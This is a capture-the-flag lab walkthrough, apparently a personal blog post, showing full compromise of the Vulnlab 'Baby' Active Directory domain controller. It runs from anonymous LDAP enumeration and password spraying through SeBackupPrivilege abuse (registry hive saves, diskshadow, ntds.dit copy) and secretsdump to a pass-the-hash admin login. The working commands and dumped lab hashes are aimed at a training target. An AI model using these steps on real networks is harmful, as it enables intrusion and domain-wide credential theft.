---
title: "[Vulnlab] Baby"
date: 2025-07-18 15:00:00 -500 
categories: [Vulnlab,CTF]
tags: [AD,redteam,hacking,ctf,vulnlab]
author: Christoph K
---


# Introduction Vulnlab Machines - Active Directory Hacking

Lets continue with some Active Directory hacking! Most of the companies nowadays still use Active Directory, which makes it so important to understand vulnerabilities for hardending the system.

We start now with an AD machine called `Baby`.



![Baby](assets/img/vulnlab/baby/01.png)


Some hints for this box:


```
User
Look into anonymous LDAP Access.

Root
Look at user privileges.

```

- First, adding the IP into our `etc/hosts`

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# echo "10.10.88.67 baby.vl" >> /etc/hosts

```

# Portscan

We do a portscan with `rustscan` which sends the open ports to `nmap`.

The command for `rustscan`:

`rustscan -a baby.vl -- -A`



```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-26 09:28:33Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-07-26T09:30:05+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-25T09:19:57
| Not valid after:  2026-01-24T09:19:57
| MD5:   7619:6a63:4977:74bf:4f21:ad2d:3aad:19a6
| SHA-1: 1b49:adf5:06a4:c35a:2f5b:c857:922e:ceac:8665:dabb
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQXh2xga8+X6lIANvHZM5XDjANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNTA3MjUwOTE5NTdaFw0yNjAx
| MjQwOTE5NTdaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvDPq+QbWe9Ro4yGwZYnlGBWQjw6bk1on7faR
| Iu/ainzO37aSwuI7kOFiTrp4MBuiUCnDARL0lBtHn+PJu4lUfULfBeAshpQqmBSy
| 8MxDHYADm+SQY52n8wZAKwkygIAJcT/XDf9R/IHGQnH+rLsSpxXZJsTDUobfX/Nf
| Jny45UcJdH1CuBzL96QlHViyvk80Xejdq2sFh8UFBdT0NXrEZwQV9/HKjGdvLQ+/
| gJuI3oI8WISr67dZIgzG5l4/wwzYXg7f6ZSpgQSYZ2vA0VrSycSLJ1glY2i5RjWY
| QVyh8O/n+6QvwsDC+edlEpyL7phTSE6nZ73Y85n2kjiZU5ksuQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAD4NxiKCvKDTE+hg1wfmZpZNwSCS68aDJ1ZPKgg1WkYnXDbWFxMWEUKIgdnX
| KU50rsOOYIgcwMu8WjfTR0A7EY+8eSPqGvFLj8+8lOXX9eYJyWcKRFbmZ73pM0A0
| u0Wi29wd58F8IjNM8JCnSamkuyJwuxShXHsJ4EkT5WrZqoEPw3H/4ns2QvWWvOqz
| jZIVl+l8HKTu6eE2baOYrMe2bgnyUsThsBfI5mon8zODSdpBgRUdpvjQ3nFkaw59
| guN+gVkfZ5JMSC9dzULacK+9RI5wdq4685S8kETqrwsjbnxz3f/+j97b7KexZGlB
| UwmuNoUTu53cyySjxheP8Vk2JIk=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-07-26T09:29:26+00:00
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing

```


We have the standard Active Directory Ports:

| Port        | Protocol     | Service                          | Description                                                   |
|-------------|--------------|----------------------------------|---------------------------------------------------------------|
| 53          | TCP/UDP      | DNS                              | Name resolution for domain services                           |
| 88          | TCP/UDP      | Kerberos                         | Authentication                                                |
| 135         | TCP          | RPC Endpoint Mapper              | Endpoint mapping for RPC-based services                       |
| 137         | UDP          | NetBIOS Name Service             | Name resolution (legacy)                                      |
| 138         | UDP          | NetBIOS Datagram Service         | Datagram messaging (legacy)                                   |
| 139         | TCP          | NetBIOS Session Service          | Session services (legacy)                                     |
| 389         | TCP/UDP      | LDAP                             | Directory services (cleartext)                                |
| 445         | TCP          | SMB                              | File sharing, Group Policy, logon scripts                     |
| 464         | TCP/UDP      | Kerberos Change/Set Password     | Changing or setting user passwords                            |
| 636         | TCP          | LDAPS                            | Secure LDAP over SSL                                          |
| 3268        | TCP          | Global Catalog                   | LDAP queries across all domains in the forest                 |
| 3269        | TCP          | Global Catalog over SSL          | Secure Global Catalog                                         |
| 49152–65535 | TCP          | RPC Dynamic Ports                | For AD replication, Group Policy, and management tools        |




# Checking anonymous SMB access

- We start without any credentials, so we can check, if can login anonymous or as guest. 

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc smb baby.vl -u '' -p '' --shares                                                       
SMB         10.10.88.67     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.10.88.67     445    BABYDC           [+] baby.vl\: 
SMB         10.10.88.67     445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc smb baby.vl -u 'guest' -p '' --shares
SMB         10.10.88.67     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc smb baby.vl -u 'anonymous' -p '' --shares
SMB         10.10.88.67     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\anonymous: STATUS_LOGON_FAILURE 
                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc smb baby.vl -u 'anonymous' -p 'anonymous' --shares
SMB         10.10.88.67     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\anonymous:anonymous STATUS_LOGON_FAILURE 
                                                                                                          
```

- Anonymous SMB does not work, lets try LDAP

# Checking LDAP access

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc ldap baby.vl -u '' -p ''                   
LDAP        10.10.88.67     389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.88.67     389    BABYDC           [+] baby.vl\: 
                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc ldap baby.vl -u '' -p '' --users
LDAP        10.10.88.67     389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.88.67     389    BABYDC           [+] baby.vl\: 
LDAP        10.10.88.67     389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.10.88.67     389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.88.67     389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.88.67     389    BABYDC           Jacqueline.Barnett            2021-11-21 22:11:03 0                                                                    
LDAP        10.10.88.67     389    BABYDC           Ashley.Webb                   2021-11-21 22:11:03 0                                                                    
LDAP        10.10.88.67     389    BABYDC           Hugh.George                   2021-11-21 22:11:03 0                                                                    
LDAP        10.10.88.67     389    BABYDC           Leonard.Dyer                  2021-11-21 22:11:03 0                                                                    
LDAP        10.10.88.67     389    BABYDC           Connor.Wilkinson              2021-11-21 22:11:08 0                                                                    
LDAP        10.10.88.67     389    BABYDC           Joseph.Hughes                 2021-11-21 22:11:08 0                                                                    
LDAP        10.10.88.67     389    BABYDC           Kerry.Wilson                  2021-11-21 22:11:08 0                                                                    
LDAP        10.10.88.67     389    BABYDC           Teresa.Bell                   2021-11-21 22:14:37 0        Set initial password to BabyStart123!     
```
- That looks good, we have a potential login with `Teresa.Bell:BabyStart123!`

- Login as `Teresa.Bell` didnt work! We have to think about something different

## Password Spray

### Creating User list


- For password spraying we need to create an userlist
- We dont need to bind to get that information, so we use `ldapsearch` to get an userlist

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# ldapsearch -H ldap://10.10.88.67 -x -b "dc=baby,dc=vl" "user" | grep dn |tee users.txt
dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl

```

- Format into users list (Regex)

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# ldapsearch -H ldap://10.10.88.67 -x -b "dc=baby,dc=vl" "user" | grep '^dn: CN=' users.txt | grep 'OU=' | sed -n 's/^dn: CN=\([^,]*\) \([^,]*\),.*/\1.\2/p' > users.txt
                                                                                                                                                                                                   
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# cat users.txt 
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Ian.Walker
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson

```



### Password Spray via nxc

- Now we can use `nxc` to use the `users.txt` for the password `BabyStart123!`:

```bash
´ ┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# nxc smb baby.vl -u users.txt -p  'BabyStart123!' --continue-on-success
SMB         10.10.88.67     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.88.67     445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```

- As we can see, Caroline needs to change the password

## Enumerating User Caroline

- For changing password we can use `smbpasswd`
- I tried `BloodyAD` and `net rpc` but both didnt work

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# smbpasswd -U 'Caroline.Robinson' -r 10.10.67.242

Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson on 10.10.67.242.

```

- now we have valid credentials and can login with `Caroline.Robinson`

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# nxc smb baby.vl -u 'Caroline.Robinson' -p 'Start1234!' --shares                          
SMB         10.10.67.242    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.10.67.242    445    BABYDC           [+] baby.vl\Caroline.Robinson:Start1234! 
SMB         10.10.67.242    445    BABYDC           [*] Enumerated shares
SMB         10.10.67.242    445    BABYDC           Share           Permissions     Remark
SMB         10.10.67.242    445    BABYDC           -----           -----------     ------
SMB         10.10.67.242    445    BABYDC           ADMIN$          READ            Remote Admin
SMB         10.10.67.242    445    BABYDC           C$              READ,WRITE      Default share
SMB         10.10.67.242    445    BABYDC           IPC$            READ            Remote IPC
SMB         10.10.67.242    445    BABYDC           NETLOGON        READ            Logon server share 
SMB         10.10.67.242    445    BABYDC           SYSVOL          READ            Logon server share 
                                                                                           

```

-  Now we can login via `winrm`

```bash
                                                                                                                                                                                                   
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# evil-winrm -u 'Caroline.Robinson' -p 'Start1234!' -i 10.10.67.242  

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 

```

- Lets get the user flag:


```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> ls

    Directory: C:\Users\Caroline.Robinson\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        11/21/2021   3:24 PM             36 user.txt

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> type user.txt
VL{b2c6150b85125d32f4b253df9540d898}
```

Userflag: `VL{b2c6150b85125d32f4b253df9540d898}`

# Privilege Escalation

- For privilege escalation on windows I always start with `whoami /priv` to see what the user is allowed to do.


```bash
*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

- There are two privileges which should get your attention: `SeBackupPrivlige` and `SeRestorePrivilege`.

- Check the links below to get more information

https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file

https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58

## Getting sam and system hives

- We can get user hashes with the registry files from `sam` and `system`
- getting sam.hive and system.hive

```bash
*Evil-WinRM* PS C:\> reg save hklm\sam C:\temp\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system C:\temp\system.hive
The operation completed successfully.
```

```bash
    Directory: C:\temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/26/2025  12:11 PM          49152 sam.hive
-a----         7/26/2025  12:11 PM       16842752 system.hive

```

- Download those files to your local directory

```bash
*Evil-WinRM* PS C:\temp> download sam.hive
                                        
Info: Downloading C:\temp\sam.hive to sam.hive
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.hive
                                        
Info: Downloading C:\temp\system.hive to system.hive
                                        
Info: Download successful!

```

- We have now “local Administrator” NTHASH

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# impacket-secretsdump -sam sam.hive -system system.hive LOCAL                                                                                           
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
                       
```

- But we can not connect via Evil-WinRM to it (Because its local)

## Shadowcopy C to get NTDS.dit

- Creating a script and upload it to the machine:

```bash
*Evil-WinRM* PS C:\temp> diskshadow /s backup.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  7/26/2025 5:02:33 PM

-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Alias cdrive for shadow ID {a623f711-6961-4ae9-b1f8-acfd87b4d07b} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {6e89039e-6181-4c1e-8c2a-4c352dd6f85a} set as environment variable.

Querying all shadow copies with the shadow copy set ID {6e89039e-6181-4c1e-8c2a-4c352dd6f85a}

        * Shadow copy ID = {a623f711-6961-4ae9-b1f8-acfd87b4d07b}               %cdrive%
                - Shadow copy set: {6e89039e-6181-4c1e-8c2a-4c352dd6f85a}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 7/26/2025 5:02:51 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {a623f711-6961-4ae9-b1f8-acfd87b4d07b}
The shadow copy was successfully exposed as E:\.
-> end backup
->
*Evil-WinRM* PS C:\temp> robocopy /b E:\Windows\ntds . ntds.dit

```

- Download ntds.dit
- Use the ntds for getting all hashes from all users

### Getting root flag
```bash
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# impacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:37e9ff90455e56e0645874ff5b72b63c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:11b285bdbd7a183df975f7603c7c815a:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:48d2533c86173af014db06b1de677daea98f273155ab0e04116ebb91350c94c1
BABYDC$:aes128-cts-hmac-sha1-96:f52447c7adc5d32f5290e9981d2ae429
BABYDC$:des-cbc-md5:4543da9dfdb00bad
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:199dd501f8e025a7e49e9700e23c76e8bfe7564aba057b2b38580e131d855536
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:af40676213e45591570fdeb361a00879
baby.vl\Caroline.Robinson:des-cbc-md5:b64ca7cbea311001
[*] Cleaning up... 

```

- Login as Domain Admin:

```bash
┌──(root㉿kali)-[/home/kali/vulnlab/baby]
└─# evil-winrm -i 10.10.85.199 -u 'administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
baby\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/21/2021   3:22 PM             36 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
VL{9000cab96bcf62e99073ff5f6653ce90}

```




Root Flag: `VL{9000cab96bcf62e99073ff5f6653ce90`


# Conclusion

A very nice machine for beginners with Active Directory. We learned some of the key concepts of a pentest at Active Directory environments:
- Recon with `nxc` and `ldapsearch`
- Creating an userlist and perform a `password spray attack` 
- Change a password from an user via `smbpasswd`
- Using `SeBackupPrivilege` for privilege escalation 


